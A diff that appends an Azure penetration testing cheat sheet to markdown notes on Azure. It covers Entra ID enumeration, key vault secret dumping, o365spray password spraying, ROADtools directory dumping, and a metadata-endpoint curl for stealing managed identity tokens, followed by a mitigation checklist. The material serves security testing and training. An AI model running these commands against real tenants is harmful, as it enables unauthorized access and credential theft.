@@ -44,3 +44,95 @@ Microsoft Azure is a cloud computing service provided by Microsoft. It offers a 
 - Azure provides extensive documentation and tutorials to help you understand and use their services.
 
 Like AWS, Azure is a vast platform with a wide range of services. Exploring specific services based on your requirements and gradually building your knowledge will help you make the most of Microsoft Azure.
+
+---
+
+# Azure Penetration Testing
+
+> Azure pentesting overlaps heavily with **Entra ID (Azure AD)** attacks. Identity is the perimeter.
+
+## Setup
+
+```bash
+# Azure CLI
+brew install azure-cli        # or: curl -sL https://aka.ms/InstallAzureCLIDeb | bash
+az login                      # interactive
+az login --service-principal -u <appId> -p <secret> --tenant <tenantId>
+
+# Who am I / what subscriptions?
+az account show
+az account list -o table
+```
+
+## Enumeration
+
+```bash
+# Users, groups, roles (Entra ID)
+az ad user list -o table
+az ad group list -o table
+az role assignment list --all -o table
+
+# Resources, storage, key vaults
+az resource list -o table
+az storage account list -o table
+az keyvault list -o table
+az keyvault secret list --vault-name <vault>
+az keyvault secret show --vault-name <vault> --name <secret>
+
+# VMs (run-command lets you execute on the guest if you have rights)
+az vm list -o table
+az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts "id"
+```
+
+## Unauthenticated / recon tooling
+
+```bash
+# Enumerate tenant + validate usernames (no creds needed)
+o365spray --validate --domain target.com
+o365spray --enum --domain target.com
+
+# AADInternals (PowerShell) — tenant recon, token manipulation
+Get-AADIntTenantID -Domain target.com
+Get-AADIntLoginInformation -Domain target.com
+
+# ROADtools — dump the whole directory once you have a token
+roadrecon auth -u user@target.com -p 'Password'
+roadrecon gather
+roadrecon gui
+```
+
+## Common attack paths
+
+- **Password spraying** against Entra ID (watch Smart Lockout):
+
+```bash
+o365spray --spray --domain target.com -U users.txt -p 'Spring2026!'
+```
+
+- **Managed Identity SSRF** on an Azure VM/App Service → steal tokens:
+
+```bash
+curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
+```
+
+- **Illicit consent grant** (phishing an OAuth app) for persistent access.
+- **BloodHound + AzureHound** to map Entra ID attack paths.
+
+## Automated tooling
+
+```bash
+prowler azure
+scout suite azure
+```
+
+## Mitigation checklist
+
+- Enforce MFA + Conditional Access; disable legacy auth protocols.
+- Least-privilege RBAC; review role assignments; PIM for just-in-time admin.
+- Restrict Managed Identity metadata access; use IMDS with care.
+- Enable Microsoft Defender for Cloud + sign-in risk policies.
+
+## Related
+
+- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
+- [Top Cloud Security Risks](Top%20Cloud%20Security%20Risks.md)
